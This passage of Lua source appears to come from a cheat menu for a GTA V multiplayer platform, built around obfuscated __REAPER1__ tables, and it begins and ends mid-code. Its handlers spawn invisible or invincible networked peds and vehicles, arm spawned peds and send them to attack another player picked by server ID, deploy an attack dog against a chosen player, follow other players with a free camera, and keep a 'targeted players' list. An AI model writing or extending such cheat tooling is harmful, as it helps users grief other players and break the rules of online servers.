                                            while __REAPER1__.N.DoesEntityExist(ped) and not __REAPER1__.N.IsEntityDead(ped) and not __REAPER1__.V.SpawningPedsPoint do
                                                __REAPER26__(0)
                                                if not __REAPER1__.N.IsEntityPlayingAnim(ped, anim.dict, anim.name, 3) then
                                                    __REAPER1__.N.TaskPlayAnim(ped, anim.dict, anim.name, -1, -1, -1, __REAPER1__.A['spawning:pedspawner_animation'].sindex and 16 or 1, 0, false, false, false)
                                                end
                                            end
                                        end
                                    end
                                end)
                            end

                            __REAPER1__.N.SetEntityVisible(ped, not __REAPER1__.A['spawning:pedspawner_invisible'].func)
                            __REAPER1__.N.SetEntityInvincible(ped, __REAPER1__.A['spawning:pedspawner_godmode'].func)

                            if __REAPER1__.A['spawning:pedspawner_spawninveh'].func ~= 'None' then
                                __REAPER1__.N.PutInVehicle(ped, __REAPER1__.N.GetHashKey(__REAPER1__.A['spawning:pedspawner_spawninveh'].func))
                            end

                            __REAPER1__.V.SpawningBlipLoop = true
                        end
                    end)
                end,
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        __REAPER1__.N.DeleteEntity(v.p, v.n)
                    end
                    __REAPER1__.T.SpawningPedList = {}
                end,
                deletelast = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = #__REAPER1__.T.SpawningPedList
                    if ped ~= 0 then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.T.SpawningPedList[ped].p, __REAPER1__.T.SpawningPedList[ped].n)
                        table.remove(__REAPER1__.T.SpawningPedList, ped)
                    else
                        __REAPER1__.F.AddNotification('No spawned peds.', 3000, 210, 210, 0)
                    end
                end,
                weapon = function(p1, p2, p3, p4, p5, p6, p7)
                    local hash = __REAPER1__.N.GetHashKey('weapon_' .. p2[p4])
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        if not __REAPER1__.N.HasPedGotWeapon(v.p, hash, false) then
                            __REAPER1__.N.GiveWeaponToPed(v.p, hash, 9999999, false, true)
                        else
                            __REAPER1__.N.RemoveWeaponFromPed(v.p, hash)
                        end
                    end
                end,
                stopanim = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        __REAPER1__.V.SpawningPedsPoint = true
                        __REAPER26__(50)
                        for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                            __REAPER1__.N.ClearPedTasks(v.p)
                        end
                        __REAPER26__(50)
                        __REAPER1__.V.SpawningPedsPoint = false
                    end)
                end,
                animation = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        __REAPER25__(function()
                            local anim = __REAPER1__.T.SpawningPedAnims[p4]
                            if __REAPER1__.F.RequestAnimDict(anim.dict) then
                                if p4 == 5 then
                                    while __REAPER1__.N.DoesEntityExist(v.p) and not __REAPER1__.N.IsEntityDead(v.p) and not __REAPER1__.V.SpawningPedsPoint do
                                        __REAPER26__(0)
                                        if not __REAPER1__.N.IsTaskMoveNetworkActive(v.p) then
                                            __REAPER1__.N.TaskMoveNetworkByName(v.p, anim.name, 0.5, 0, anim.dict, 24)
                                        end
                    
                                        __REAPER1__.N.SetTaskMoveNetworkSignalFloat(v.p, "Pitch", 0.4)
                                        __REAPER1__.N.SetTaskMoveNetworkSignalFloat(v.p, "Heading", 0.5)
                                        __REAPER1__.N.SetTaskMoveNetworkSignalBool(v.p, "isBlocked", false)
                                        __REAPER1__.N.SetTaskMoveNetworkSignalBool(v.p, "isFirstPerson", false)
                                    end
                                else
                                    while __REAPER1__.N.DoesEntityExist(v.p) and not __REAPER1__.N.IsEntityDead(v.p) and not __REAPER1__.V.SpawningPedsPoint do
                                        __REAPER26__(0)
                                        if not __REAPER1__.N.IsEntityPlayingAnim(v.p, anim.dict, anim.name, 3) then
                                            __REAPER1__.N.TaskPlayAnim(v.p, anim.dict, anim.name, -1, -1, -1, p4 and 16 or 1, 0, false, false, false)
                                        end
                                    end
                                end
                            end
                        end)
                    end
                end,
                follow = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.F.ClosestEntity('player')
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        --__REAPER1__.N.TaskTurnPedToFaceEntity(v, ped, -1)
                        if p2 then
                            __REAPER1__.N.TaskFollowToOffsetOfEntity(v.p, ped, 0.0, 0.0, 0.0, 30.0, -1, 100.0, 1)
                        else
                            __REAPER1__.N.TaskFollowToOffsetOfEntity(v.p, ped, 0.0, 0.0, 0.0, 30.0, 1, 100.0, 1)
                        end
                    end
                end,
                mindclear = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        __REAPER1__.V.SpawningPedsPoint = true
                        __REAPER26__(50)
                        for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                            __REAPER1__.N.ClearPedTasksImmediately(v.p)
                        end
                        __REAPER26__(50)
                        __REAPER1__.V.SpawningPedsPoint = false
                    end)
                end,
                condition = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        if p4 == 1 then
                            __REAPER1__.N.SetPedAngry(v.p)
                        elseif p4 == 2 then
                            __REAPER1__.N.SetPedHearingRange(v.p, 0.0)
                        elseif p4 == 3 then
                            __REAPER1__.N.SetPedSeeingRange(v.p, 0.0)
                        elseif p4 == 4 then
                            __REAPER1__.N.SetPedHearingRange(v.p, 0.0)
                            __REAPER1__.N.SetPedSeeingRange(v.p, 0.0)
                        end
                    end
                end,
                attack = function(p1, p2, p3, p4, p5, p6, p7)
                    local ply = __REAPER1__.N.GetPlayerFromServerId(p2)

                    if __REAPER1__.N.NetworkIsPlayerActive(ply) then
                        local ped = __REAPER1__.N.GetPlayerPed(ply)
                        for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                            __REAPER1__.N.TaskCombatPed(v.p, ped, 0, 16)
                        end
                    else
                        __REAPER1__.F.AddNotification('Not a valid player server id.', 5000, 210, 210, 0)
                    end
                end,
                freeze = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        __REAPER1__.N.FreezeEntityPosition(v.p, p2)
                    end
                end,
                randomizeclothing = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        __REAPER1__.N.SetPedRandomComponentVariation(v.p)
                    end
                end,
                togglevis = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        __REAPER1__.N.SetEntityVisible(v.p, not __REAPER1__.N.IsEntityVisible(v.p))
                    end
                end,
                togglegod = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        __REAPER1__.N.SetEntityInvincible(v.p, __REAPER1__.N.GetEntityCanBeDamaged(v.p))
                    end
                end,
                putinveh = function(p1, p2, p3, p4, p5, p6, p7)
                    local hash = __REAPER1__.N.GetHashKey(p2)
                    for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                        __REAPER1__.N.PutInVehicle(v.p, hash)
                    end
                end,
            },
            vehiclespawner = {
                spawn = function(p1, p2, p3, p4, p5, p6, p7)
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    local heading = __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed)
                    if __REAPER1__.A['spawning:vehiclespawner_coords'].func ~= 'None' then
                        coords = vector3(__REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['spawning:vehiclespawner_coords'].func, ' ', true))
                    end
                    if __REAPER1__.A['spawning:vehiclespawner_heading'].sindex ~= 1 then
                        heading = __REAPER1__.F.IntToFloat(__REAPER1__.A['spawning:vehiclespawner_heading'].sindex - 2)
                    end
        
                    local hash = __REAPER1__.N.GetHashKey(p4 and __REAPER1__.T.SpawningVehicles[p4] or p2)

                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(hash) then
                            local veh = __REAPER1__.N.CreateVehicle(hash, coords, heading, __REAPER1__.A['spawning:vehiclespawner_networked'].func, __REAPER1__.A['spawning:vehiclespawner_missionentity'].func)
                            table.insert(__REAPER1__.T.SpawningVehicleList, {v = veh, n = not __REAPER1__.A['spawning:vehiclespawner_networked'].func})

                            if __REAPER1__.A['spawning:vehiclespawner_fuckedup'].func then
                                __REAPER1__.N.FuckUpVeh(veh)
                            end

                            if __REAPER1__.A['spawning:vehiclespawner_randomizedlook'].func then
                                __REAPER1__.N.RandomizeVehLook(veh)
                            end

                            if __REAPER1__.A['spawning:vehiclespawner_locked'].func then
                                __REAPER1__.N.OpDoorLock(veh, 2)
                            end

                            __REAPER1__.N.SetEntityVisible(veh, not __REAPER1__.A['spawning:vehiclespawner_invisible'].func)
                            __REAPER1__.N.SetEntityInvincible(veh, __REAPER1__.A['spawning:vehiclespawner_godmode'].func)

                            __REAPER1__.V.SpawningBlipLoop = true
                        end
                    end)
                end,
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.DeleteEntity(v.v, v.n)
                    end
                    __REAPER1__.T.SpawningVehicleList = {}
                end,
                deletelast = function(p1, p2, p3, p4, p5, p6, p7)
                    local veh = #__REAPER1__.T.SpawningVehicleList
                    if veh ~= 0 then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.T.SpawningVehicleList[veh].v, __REAPER1__.T.SpawningVehicleList[veh].n)
                        table.remove(__REAPER1__.T.SpawningVehicleList, veh)
                    else
                        __REAPER1__.F.AddNotification('No spawned vehicles.', 3000, 210, 210, 0)
                    end
                end,
                tuneveh = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.TuneVehicle(v.v)
                    end
                end,
                randomize = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.RandomizeVehLook(v.v)
                    end
                end,
                fuckup = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.FuckUpVeh(v.v)
                    end
                end,
                fix = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.FixVehicle(v.v)
                    end
                end,
                maxspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.SetEntityMaxSpeed(v.v, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                    end
                end,
                setspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.SetVehicleForwardSpeed(v.v, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                    end
                end,
                removewheels = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.RemoveWheel(v.v)
                    end
                end,
                freeze = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.FreezeEntityPosition(v.v, p2)
                    end
                end,
                opendoor = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.SetVehicleDoorOpen(v.v, p4 - 1, false, false)
                    end
                end,
                closedoor = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.SetVehicleDoorShut(v.v, p4 - 1, false)
                    end
                end,
                togglelock = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        local lock = __REAPER1__.N.GetVehicleDoorLockStatus(v.v)
                        if lock == 0 or lock == 1 then
                            __REAPER1__.N.OpDoorLock(v.v, 2)
                        elseif lock == 2 then
                            __REAPER1__.N.OpDoorLock(v.v, 1)
                        end
                    end
                end,
                togglevis = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.SetEntityVisible(v.v, not __REAPER1__.N.IsEntityVisible(v.v))
                    end
                end,
                togglegod = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                        __REAPER1__.N.SetEntityInvincible(v.v, __REAPER1__.N.GetEntityCanBeDamaged(v.v))
                    end
                end,
            }
        },
        misc = {
            antiafk = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.V.AntiAfking = false
                if not p2 then
                    __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed)
                end
            end,
            overridefov = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.FovCamera(p2)
            end,
            fov = function(p1, p2, p3, p4, p5, p6, p7)
                if __REAPER1__.N.DoesCamExist(__REAPER1__.V.FovCamera) then
                    __REAPER1__.N.SetCamFov(__REAPER1__.V.FovCamera, __REAPER1__.F.IntToFloat(p4 - 1))
                end
            end,
            radar = function(p1, p2, p3, p4, p5, p6, p7)
                if not p5 then
                    __REAPER1__.N.SetBigmapActive(false, false)
                end
            end,
            zoom = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetRadarZoom(p2[p4])
            end,
            radio = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetMobilePhoneRadioState(p2)
                __REAPER1__.N.SetMobileRadioEnabledDuringGameplay(p2)
            end,
            setwet = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedWetnessHeight(__REAPER1__.V.SelfPed, 100.0)
            end,
            clearwet = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.ClearPedWetness(__REAPER1__.V.SelfPed)
            end,
            clearblood = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.ClearPedBloodDamage(__REAPER1__.V.SelfPed)
            end,
            clearlimb = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.ClearEntityLastDamageEntity(__REAPER1__.V.SelfPed)
            end,
            freecam = {
                freecam = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.Freecam(p2)
                end,
                resetfov = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.V.FreecamFov = 50
                    if __REAPER1__.N.DoesCamExist(__REAPER1__.V.Freecam) then
                        __REAPER1__.N.SetCamFov(__REAPER1__.V.Freecam, __REAPER1__.F.IntToFloat(__REAPER1__.V.FreecamFov))
                    end
                end,
                keepcoords = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.V.FreecamCoords, __REAPER1__.V.FreecamRot = nil, nil
                end,
                tptoply = function(p1, p2, p3, p4, p5, p6, p7)
                    local ply = __REAPER1__.N.GetPlayerFromServerId(p2)

                    if __REAPER1__.N.NetworkIsPlayerActive(ply) then
                        local c = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(ply))
                        __REAPER1__.N.SetCamCoord(__REAPER1__.V.Freecam, c.x, c.y, c.z)
                    else
                        __REAPER1__.F.AddNotification('Not a valid player server id.', 5000, 210, 210, 0)
                    end
                end,
            },
            rccar = {
                rccar = function(p1, p2, p3, p4, p5, p6, p7)
                    if p2 then
                        __REAPER25__(function()
                            if __REAPER1__.F.RequestEntity(`rcbandito`) then
                                __REAPER1__.V.Rclastcoords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                                local sx, sy, sz = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['misc:rccar_atcoords'].func, ' ', true)

                                __REAPER1__.V.Rcbandito = __REAPER1__.N.CreateVehicle(`rcbandito`, sz and vector3(sx, sy, sz) or __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, 0, 5.0, 0), __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed), true, true)
                                __REAPER1__.N.OpDoorLock(__REAPER1__.V.Rcbandito, 2)

                                __REAPER1__.N.SetEntityVisible(__REAPER1__.V.Rcbandito, not __REAPER1__.A['misc:rccar_invisible'].func)
                                __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.Rcbandito, __REAPER1__.A['misc:rccar_god'].func)
        
                                if __REAPER1__.A['misc:rccar_blip'].func then
                                    __REAPER1__.M.misc.rccar.blip(nil, true)
                                end

                                if __REAPER1__.F.RequestEntity(`mp_m_freemode_01`--[[UDP]]) then
                                    __REAPER1__.V.RccarDriver = __REAPER1__.N.CreatePed(5, `mp_m_freemode_01`--[[UDP]], 0, 0, true)

                                    __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.RccarDriver, true)
                                    __REAPER1__.N.SetEntityVisible(__REAPER1__.V.RccarDriver, false)
                                    __REAPER1__.N.FreezeEntityPosition(__REAPER1__.V.RccarDriver, true)
                                    __REAPER1__.N.SetPedAlertness(__REAPER1__.V.RccarDriver, 0.0)

                                    __REAPER1__.N.SetPedIntoVehicle(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, -1)
                                end

                                __REAPER1__.N.RcCam(true)
                                __REAPER1__.M.misc.rccar.blade(nil, __REAPER1__.A['misc:rccar_blade'].func)
                            end
                        end)
                    else
                        if __REAPER1__.A['misc:rccar_delete'].func and __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcbandito) then
                            __REAPER1__.N.DeleteEntity(__REAPER1__.V.Rcbandito)
                            __REAPER1__.N.DeleteEntity(__REAPER1__.V.RccarDriver)
                        end
                        __REAPER1__.N.RcCam(false)
                        __REAPER1__.M.misc.rccar.blade(nil, __REAPER1__.A['misc:rccar_blade'].func)
                    end
                    
                end,
                blip = function(p1, p2, p3, p4, p5, p6, p7)
                    if p2 and __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcbandito) then
                        __REAPER1__.V.RccarBlip = __REAPER1__.N.AddBlipForCoord(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.Rcbandito))
                        __REAPER1__.N.SetBlipSprite(__REAPER1__.V.RccarBlip, 399)
                        __REAPER1__.N.SetBlipScale(__REAPER1__.V.RccarBlip, 0.7)
                        __REAPER1__.N.SetBlipColour(__REAPER1__.V.RccarBlip, 6)
                    elseif __REAPER1__.N.DoesBlipExist(__REAPER1__.V.RccarBlip) then
                        __REAPER1__.N.RemoveBlip(__REAPER1__.V.RccarBlip)
                        __REAPER1__.V.RccarBlip = nil
                    end
                end,
                invisible = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcbandito) then
                        __REAPER1__.N.SetEntityVisible(__REAPER1__.V.Rcbandito, not p2)
                    end
                end,
                god = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcbandito) then
                        __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.Rcbandito, p2)
                    end
                end,
                blade = function(p1, p2, p3, p4, p5, p6, p7)
                    if p2 and __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcbandito) then
                        __REAPER25__(function()
                            if __REAPER1__.F.RequestEntity(`skylift`) then
                                __REAPER1__.V.Rcblade = __REAPER1__.N.CreateVehicle(`skylift`, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.Rcbandito), __REAPER1__.N.GetEntityHeading(__REAPER1__.V.Rcbandito), true, true)
                                __REAPER1__.N.AttachEntityToEntity(__REAPER1__.V.Rcblade, __REAPER1__.V.Rcbandito, __REAPER1__.N.GetEntityBoneIndexByName(__REAPER1__.V.Rcbandito, 'bonnet'), 0.0, 3.0, -4.35, 0, 0, 0, false, false, true, false, 0, true)
                                __REAPER1__.N.SetEntityVisible(__REAPER1__.V.Rcbandito, not __REAPER1__.A['misc:rccar_binvisible'].func)
                                __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.Rcbandito, __REAPER1__.A['misc:rccar_bgod'].func)
                            end
                        end)
                    elseif __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcblade) then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.V.Rcblade)
                    end
                end,
                binvisible = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcblade) then
                        __REAPER1__.N.SetEntityVisible(__REAPER1__.V.Rcblade, not p2)
                    end
                end,
                bgod = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcblade) then
                        __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.Rcblade, p2)
                    end
                end,
            },
            k9 = {
                deploy = function(p1, p2, p3, p4, p5, p6, p7)
                    if p2 then
                        __REAPER25__(function()
                            local ped = 'a_c_' .. __REAPER1__.A['misc:k9unit_breed'].func[__REAPER1__.A['misc:k9unit_breed'].sindex]
                            local pedhash = __REAPER1__.N.GetHashKey(ped)
                            local sx, sy, sz = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['misc:k9unit_atcoords'].func, ' ', true)

                            if __REAPER1__.F.RequestEntity(pedhash) then
                                __REAPER1__.V.K9 = __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType(ped), pedhash, sz and vector3(sx, sy, sz) or __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, 0, 5.0, 0), __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed), true, true)
        
                                if __REAPER1__.A['misc:k9unit_defend'].func then
                                    __REAPER1__.N.SetPedAsGroupLeader(__REAPER1__.V.SelfPed, __REAPER1__.N.GetPlayerGroup(__REAPER1__.V.SelfPed))
                                    local relationGroup = __REAPER1__.N.GetHashKey(__REAPER1__.N.GetPedRelationshipGroupHash(__REAPER1__.V.K9))
                                    __REAPER1__.N.SetPedAsGroupMember(__REAPER1__.V.K9, __REAPER1__.N.GetPlayerGroup(__REAPER1__.V.SelfPed))
                                    __REAPER1__.N.SetPedNeverLeavesGroup(__REAPER1__.V.K9, true)
                                    __REAPER1__.N.SetRelationshipBetweenGroups(0, `PLAYER`, relationGroup)
                                    __REAPER1__.N.SetRelationshipBetweenGroups(0, relationGroup, `PLAYER`)
                                    __REAPER1__.N.SetRelationshipBetweenGroups(1, `PLAYER`, relationGroup)
                                    __REAPER1__.N.SetRelationshipBetweenGroups(1, relationGroup, `PLAYER`)
                                    __REAPER1__.N.SetCanAttackFriendly(__REAPER1__.V.K9, false, false)
                                end
                                if __REAPER1__.A['misc:k9unit_follow'].func then
                                    __REAPER1__.N.TaskFollowToOffsetOfEntity(__REAPER1__.V.K9, __REAPER1__.V.SelfPed, 0.0, 0.0, 0.0, 30.0, -1, 100.0, 1)
                                end
                                __REAPER1__.N.SetEntityVisible(__REAPER1__.V.K9, not __REAPER1__.A['misc:k9unit_invisible'].func)
                                __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.K9, __REAPER1__.A['misc:k9unit_godded'].func)

                                if __REAPER1__.A['misc:k9unit_blip'].func then
                                    __REAPER1__.M.misc.k9.blip(nil, true)
                                end
                            end
                        end)
                    elseif __REAPER1__.N.DoesEntityExist(__REAPER1__.V.K9) then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.V.K9)
                    end
                end,
                defend = function(p1, p2, p3, p4, p5, p6, p7)
                    if p2 and __REAPER1__.N.DoesEntityExist(__REAPER1__.V.K9) then
                        __REAPER1__.N.SetPedAsGroupLeader(__REAPER1__.V.SelfPed, __REAPER1__.N.GetPlayerGroup(__REAPER1__.V.SelfPed))
                        local relationGroup = __REAPER1__.N.GetHashKey(__REAPER1__.N.GetPedRelationshipGroupHash(__REAPER1__.V.K9))
                        __REAPER1__.N.SetPedAsGroupMember(__REAPER1__.V.K9, __REAPER1__.N.GetPlayerGroup(__REAPER1__.V.SelfPed))
                        __REAPER1__.N.SetPedNeverLeavesGroup(__REAPER1__.V.K9, true)
                        __REAPER1__.N.SetRelationshipBetweenGroups(0, `PLAYER`, relationGroup)
                        __REAPER1__.N.SetRelationshipBetweenGroups(0, relationGroup, `PLAYER`)
                        __REAPER1__.N.SetRelationshipBetweenGroups(1, `PLAYER`, relationGroup)
                        __REAPER1__.N.SetRelationshipBetweenGroups(1, relationGroup, `PLAYER`)
                        __REAPER1__.N.SetCanAttackFriendly(__REAPER1__.V.K9, false, false)
                    elseif __REAPER1__.N.DoesEntityExist(__REAPER1__.V.K9) then
                        __REAPER1__.N.RemovePedFromGroup(__REAPER1__.V.K9)
                    end
                end,
                follow = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.K9) then
                        __REAPER1__.N.TaskFollowToOffsetOfEntity(__REAPER1__.V.K9, __REAPER1__.V.SelfPed, 0.0, 0.0, 0.0, 30.0, p2 and -1 or 1, 100.0, 1)
                    end
                end,
                attack = function(p1, p2, p3, p4, p5, p6, p7)
                    local ply = __REAPER1__.N.GetPlayerFromServerId(p2)

                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.K9) then
                        if __REAPER1__.N.NetworkIsPlayerActive(ply) then
                            local ped = __REAPER1__.N.GetPlayerPed(ply)
                            __REAPER1__.N.TaskCombatPed(__REAPER1__.V.K9, ped, 0, 16)
                        else
                            __REAPER1__.F.AddNotification('Not a valid player server id.', 5000, 210, 210, 0)
                        end
                    end
                end,
                sit = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.K9) then
                        if __REAPER1__.N.IsEntityPlayingAnim(__REAPER1__.V.K9, 'creatures@retriever@amb@world_dog_sitting@idle_a', 'idle_b', 3) or __REAPER1__.N.IsEntityPlayingAnim(__REAPER1__.V.K9, 'creatures@pug@amb@world_dog_sitting@idle_a', 'idle_b', 3) or __REAPER1__.N.IsEntityPlayingAnim(__REAPER1__.V.K9, 'creatures@rottweiler@amb@world_dog_sitting@idle_a', 'idle_b', 3) then
                            __REAPER1__.N.ClearPedTasks(__REAPER1__.V.K9)
                        else
                            __REAPER25__(function()
                                local dict = (__REAPER1__.A['misc:k9unit_sit'].sindex == 7 or __REAPER1__.A['misc:k9unit_sit'].sindex == 4) and 'creatures@pug@amb@world_dog_sitting@idle_a' or (__REAPER1__.A['misc:k9unit_sit'].sindex == 1 or __REAPER1__.A['misc:k9unit_sit'].sindex == 6) and 'creatures@rottweiler@amb@world_dog_sitting@idle_a' or 'creatures@retriever@amb@world_dog_sitting@idle_a'
                                if __REAPER1__.F.RequestAnimDict(dict) then
                                    __REAPER1__.N.TaskPlayAnim(__REAPER1__.V.K9, dict, 'idle_b', 8.0, 8.0, -1, 1, 0, false, false, false)
                                end
                            end)
                        end
                    end
                end,
                invis = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.K9) then
                        __REAPER1__.N.SetEntityVisible(__REAPER1__.V.K9, not p2)
                    end
                end,
                godded = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.K9) then
                        __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.K9, p2)
                    end
                end,
                blip = function(p1, p2, p3, p4, p5, p6, p7)
                    if p2 and __REAPER1__.N.DoesEntityExist(__REAPER1__.V.K9) then
                        __REAPER1__.V.k9Blip = __REAPER1__.N.AddBlipForCoord(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.K9))
                        __REAPER1__.N.SetBlipSprite(__REAPER1__.V.k9Blip, 399)
                        __REAPER1__.N.SetBlipScale(__REAPER1__.V.k9Blip, 0.7)
                        __REAPER1__.N.SetBlipColour(__REAPER1__.V.k9Blip, 26)
                    elseif __REAPER1__.N.DoesBlipExist(__REAPER1__.V.k9Blip) then
                        __REAPER1__.N.RemoveBlip(__REAPER1__.V.k9Blip)
                        __REAPER1__.V.k9Blip = nil
                    end
                end,
            },
            hudelements = {
                hudcolor = function(p1, p2, p3, p4, p5, p6, p7)
                    local r, g, b, a = __REAPER1__.F.MenuExtra(p1)
                    __REAPER1__.N.ReplaceHudColourWithRgba(116, r, g, b, a)
                end,
            },
            controls = {
                imitate = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetControlNormal(0, __REAPER1__.T.ControlsPlain[p2[p4]], 1.0)
                end,
                iimitate = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetControlNormal(0, p2[p4], 1.0)
                end,
            },
        },
        oplayers = {
            target = function(p1, p2, p3, p4, p5, p6, p7)
                if p2 then
                    local pid = __REAPER1__.N.GetPlayerFromServerId(p6)
                    table.insert(__REAPER1__.T.Display['server:targetinglist:targetedplayers'], {text = __REAPER1__.N.GetPlayerName(pid), dkey = 'server:targetinglist:targetedplayers' .. p6, desc = 'Remove ' .. __REAPER1__.N.GetPlayerName(pid) .. ' from the targeting list.', afu = __REAPER1__.M.tlist.remove, option = __REAPER1__.M.Button, extra = p6, extra2 = #__REAPER1__.T.Display['server:targetinglist:targetedplayers'] + 1})
                
                    if __REAPER1__.T.Display['server:targetinglist'][2] == nil then
                        __REAPER1__.T.Display['server:targetinglist'] = {
                            {text = 'Targeted players', dkey = 'server:targetinglist:targetedplayers', desc = 'Targeted players menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:targetedplayers'}, lasto = 1, scrollo = 0, addedo = 0},
